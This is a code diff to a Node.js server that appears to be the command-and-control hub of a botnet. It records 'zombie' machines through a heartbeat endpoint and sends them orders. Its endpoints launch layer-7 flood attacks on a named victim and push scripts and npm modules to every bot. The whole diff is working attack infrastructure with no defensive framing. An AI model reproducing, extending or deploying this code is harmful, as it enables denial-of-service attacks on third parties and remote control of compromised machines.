@@ -37,6 +37,8 @@ logger.init(initSign, "Called 'crypto'")
 const callerId = require('caller-id');
 const { await } = require('signale');
 logger.init(initSign, "Called 'caller-id'")
+const bodyParser = require('body-parser');
+
 let initLogID = crypto.randomBytes(5).toString('hex')
 
 let initiated = false
@@ -45,15 +47,15 @@ let SERVICELINK = null
 let SERVICENAME = null
 let SCRIPTS = null
 let CURRENTPORT = null
-let activeMachines = []
+let activeMachinesList = []
 let GLOBALS = {}
 const dbok = new EventEmitter()
 
 function logID() {
     return crypto.randomBytes(5).toString('hex');
 }
-server.use((req, res, next) => {
 
+server.use((req, res, next) => {
     //console.log(req);
     if (req.method === "POST") {
         if ((req.headers.accesskey)) {
@@ -89,6 +91,9 @@ app.use((req, res, next) => {
     }
 })
 
+app.use(bodyParser.urlencoded({ extended: true }));
+app.use(bodyParser.json());
+app.use(bodyParser.raw());
 
 server.use(middlewares)
 server.use(router)
@@ -141,7 +146,6 @@ app.get('/scripts', (req, res) => {
                 })
             })
     }
-
 })
 
 app.get('/setup', (req, res) => {
@@ -236,20 +240,60 @@ app.get('/', (req, res) => {
     res.send(200, "OKAY")
 })
 
-app.get('/heartbeat', (req, res) => {
+app.get('/globals', (req, res) => {
+    GLOBALS.port.leftForChange = ((GLOBALS.port.changeAt) - (Date.now()))
+    GLOBALS.port.shouldChange = (GLOBALS.port.changeAt <= Date.now())
+    GLOBALS.port.shouldChange = (GLOBALS.port.changeAt <= Date.now())
+    res.send(200, GLOBALS)
+})
+
+app.post('/heartbeat', (req, res) => {
     let ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress
     ip = ip.toString().replace('::ffff:', '');
-    if (!activeMachines.includes(ip)) {
-        activeMachines.push(ip)
+    if (!activeMachinesList.includes(ip)) {
+        let currentMachineData_ = req.body.zombie
+        let currentMachineData = currentMachineData_.zombie_
+        currentMachineData.id = ip
+        activeMachinesList.push(ip)
+        axios.post(`http://localhost:3000/machines/`, currentMachineData)
+            .then(res => {
+                res.send(200)
+            })
+            .catch(err => {
+                console.error(err);
+                res.send(500, {
+                    error: {
+                        message: "DATABASE_ERR",
+                        innerResponse: err.message
+                    }
+                })
+            })
+    } else {
+        let currentMachineData_ = req.body.zombie
+        let currentMachineData = currentMachineData_.zombie_
+        currentMachineData.id = ip
+        axios.patch(`http://localhost:3000/machines/${ip}`, currentMachineData)
+        .then(res => {
+            res.send(200)
+        })
+        .catch(err => {
+            console.error(err);
+            res.send(500, {
+                error: {
+                    message: "DATABASE_ERR",
+                    innerResponse: err.message
+                }
+            })
+        })
     }
     res.send(200, "OKAY")
 })
 
 app.get('/all/installscript/:scriptid', (req, res) => {
-    clen = activeMachines.length
+    clen = activeMachinesList.length
     for (let index = 0; index < clen; index++) {
-        console.log(`Asking ${activeMachines[index]}:${CURRENTPORT}`);
-        axios.get(`http://${activeMachines[index]}:${CURRENTPORT}/installScript/${req.params.scriptid}`)
+        console.log(`Asking ${activeMachinesList[index]}:${CURRENTPORT}`);
+        axios.get(`http://${activeMachinesList[index]}:${CURRENTPORT}/installScript/${req.params.scriptid}`)
             .then(res => {
                 console.log(res.data)
             })
@@ -261,10 +305,10 @@ app.get('/all/installscript/:scriptid', (req, res) => {
     res.send(200, "OKAY")
 })
 app.get('/all/npminstall/:module', (req, res) => {
-    clen = activeMachines.length
+    clen = activeMachinesList.length
     for (let index = 0; index < clen; index++) {
-        console.log(`Asking ${activeMachines[index]}:${CURRENTPORT}`);
-        axios.get(`http://${activeMachines[index]}:${CURRENTPORT}/npminstall/${req.params.module}`)
+        console.log(`Asking ${activeMachinesList[index]}:${CURRENTPORT}`);
+        axios.get(`http://${activeMachinesList[index]}:${CURRENTPORT}/npminstall/${req.params.module}`)
             .then(res => {
                 console.log(res.data)
             })
@@ -277,34 +321,35 @@ app.get('/all/npminstall/:module', (req, res) => {
 })
 
 app.get('/all/attacklayer7/:methodID/:victim/:time/:attackID', async (req, res) => {
-    clen = activeMachines.length
+    clen = activeMachinesList.length
     let machines = {
-        all: activeMachines,
+        all: activeMachinesList,
         asked: [],
         responded: [],
         busy: []
     }
     for (let index = 0; index < clen; index++) {
-        machines.asked.push(activeMachines[index])
-        console.log(`http://${activeMachines[index]}:${CURRENTPORT}/layer7/${req.params.methodID}/${req.params.victim}/${req.params.time}/${req.params.attackID}`);
-        axios.get(`http://${activeMachines[index]}:${CURRENTPORT}/layer7/${req.params.methodID}/${req.params.victim}/${req.params.time}/${req.params.attackID}`)
+        machines.asked.push(activeMachinesList[index])
+        console.log(`http://${activeMachinesList[index]}:${CURRENTPORT}/layer7/${req.params.methodID}/${req.params.victim}/${req.params.time}/${req.params.attackID}`);
+        axios.get(`http://${activeMachinesList[index]}:${CURRENTPORT}/layer7/${req.params.methodID}/${req.params.victim}/${req.params.time}/${req.params.attackID}`)
             .then(res => {
                 console.log(res.data)
-                machines.responded.push(activeMachines[index])
+                machines.responded.push(activeMachinesList[index])
             })
             .catch(err => {
                 console.error(err.response.data);
-                machines.busy.push(activeMachines[index])
+                machines.busy.push(activeMachinesList[index])
             })
     }
     await delay(3000)
     res.send(200, { asked: machines.asked.length, responded: machines.responded.length, busy: machines.responded.busy, data: machines })
 })
+
 app.get('/all/update', (req, res) => {
-    clen = activeMachines.length
+    clen = activeMachinesList.length
     for (let index = 0; index < clen; index++) {
-        console.log(`http://${activeMachines[index]}:${CURRENTPORT}/update`);
-        axios.get(`http://${activeMachines[index]}:${CURRENTPORT}/update`)
+        console.log(`http://${activeMachinesList[index]}:${CURRENTPORT}/update`);
+        axios.get(`http://${activeMachinesList[index]}:${CURRENTPORT}/update`)
             .then(res => {
                 console.log(res.data)
             })
@@ -315,34 +360,41 @@ app.get('/all/update', (req, res) => {
     }
     res.send(200, "OKAY")
 })
-app.get('/globals', (req, res) => {
-    GLOBALS.port.leftForChange = ((GLOBALS.port.changeAt) - (Date.now()))
-    GLOBALS.port.shouldChange = (GLOBALS.port.changeAt <= Date.now())
-    GLOBALS.port.shouldChange = (GLOBALS.port.changeAt <= Date.now())
-    res.send(200, GLOBALS)
-})
+
 app.get('/machines/active', (req, res) => {
-    res.send(200, activeMachines)
+    res.send(200, activeMachinesList)
+})
+app.get('/machines/detailed/active', (req, res) => {
+    res.send(200, activeMachinesList)
+})
+app.get('/machines/detailed/inactive', (req, res) => {
+    res.send(200, activeMachinesList)
+})
+app.get('/machines/detailed/busy', (req, res) => {
+    res.send(200, activeMachinesList)
+})
+app.get('/machines/detailed/systemInfo', (req, res) => {
+    res.send(200, activeMachinesList)
 })
 app.get('/machines/testReachability/:timeout', async (req, res) => {
-    let clen = activeMachines.length
+    let clen = activeMachinesList.length
     let reachable = []
     let unreachable = []
     let timeout_ = 5
-    if (!isNaN(req.params.timeout)){
+    if (!isNaN(req.params.timeout)) {
         if (req.params.timeout <= 10)
-        timeout_ = parseInt(req.params.timeout)
+            timeout_ = parseInt(req.params.timeout)
     }
     for (let index = 0; index < clen; index++) {
-        console.log(`Asking ${activeMachines[index]}:${CURRENTPORT}`);
-        axios.get(`http://${activeMachines[index]}:${CURRENTPORT}/status`, {
+        console.log(`Asking ${activeMachinesList[index]}:${CURRENTPORT}`);
+        axios.get(`http://${activeMachinesList[index]}:${CURRENTPORT}/status`, {
             timeout: timeout_ * 1000,
         })
             .then(res => {
-                reachable.push(activeMachines[index])
+                reachable.push(activeMachinesList[index])
             })
             .catch(err => {
-                unreachable.push(activeMachines[index])
+                unreachable.push(activeMachinesList[index])
             })
     }
     await delay(((timeout_ + 1) * 1000))
@@ -619,7 +671,7 @@ async function adaptPort() {
                 console.log("repl");
                 console.log(GLOBALS);
                 globalLock = false;
-            }) 
+            })
             .catch(err => {
                 dbok.emit('false')
                 console.log(err);
@@ -690,6 +742,6 @@ function updateMasterSubdomain() {
 }
 
 setInterval(function () {
-    activeMachines = []
+    activeMachinesList = []
     updateMasterSubdomain()
 }, 60000)
